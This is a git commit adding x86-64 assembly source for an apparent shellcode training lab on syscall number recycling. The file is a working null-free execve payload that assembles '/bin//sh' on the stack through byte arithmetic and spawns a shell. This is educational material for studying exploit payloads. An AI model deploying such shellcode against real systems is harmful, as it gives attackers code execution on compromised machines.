cfd48d090443680b57b182f48419513c789f6bb7
Ravindu Piyankara <78452012+Ravindu-Priyankara@users.noreply.github.com>
2026-01-02 13:00:47 +0530

    feat: Add lab06.4 syscall number recycling source code

---
+++ shellcode-labs/Lab_06_Register_Recycling/lab_04_Syscall_Number_Recycling(Dirty Context)/source_code/lab04.asm
@@ -0,0 +1,65 @@
+section .text
+global _start
+
+; assumption:
+;	- rax is positive number
+; 	- no zero registers
+
+_start:
+	cdq
+	push rdx
+	pop rsi		; argv
+	push rsi	; null terminator
+
+	sub rsp, 8	; reserve 8 bytes from the stack
+
+	; byte 0 = '/', decimal value = 47
+	mov dl, 48
+	dec dl
+	mov byte[rsp + 0], dl
+
+	; byte 1 = 'b', decimal value = 98
+	mov dl, 100
+	sub dl, 2
+	mov byte[rsp + 1], dl
+
+	; byte 2 = 'i', decimal value = 105
+	mov dl, 100
+	add dl, 5
+	mov byte[rsp + 2], dl
+
+	; byte 3 = 'n', decimal value = 110
+	mov dl, 109
+	inc dl
+	mov byte[rsp + 3], dl
+
+	; byte 4 = '/', decimal value = 47
+	mov dl, 48
+        dec dl
+        mov byte[rsp + 4], dl
+
+	; byte 5 = '/', decimal value = 47
+	mov dl, 48
+        dec dl
+        mov byte[rsp + 5], dl
+
+	; byte 6 = 's', decimal value = 115
+	mov dl, 110
+	add dl, 5
+	mov byte[rsp + 6], dl	
+
+	; byte 7 = 'h', decimal value = 104
+	mov dl, 105
+	dec dl
+	mov byte[rsp + 7], dl
+
+	; construct syscall number
+	push rsi
+	pop rax		; rax = 0
+	mov al, 100
+	sub al, 41	; 100 - 41
+
+	mov rdi, rsp	; rdi point to string
+	push rsi
+	pop rdx		; rdx = 0 [envp]
+	syscall
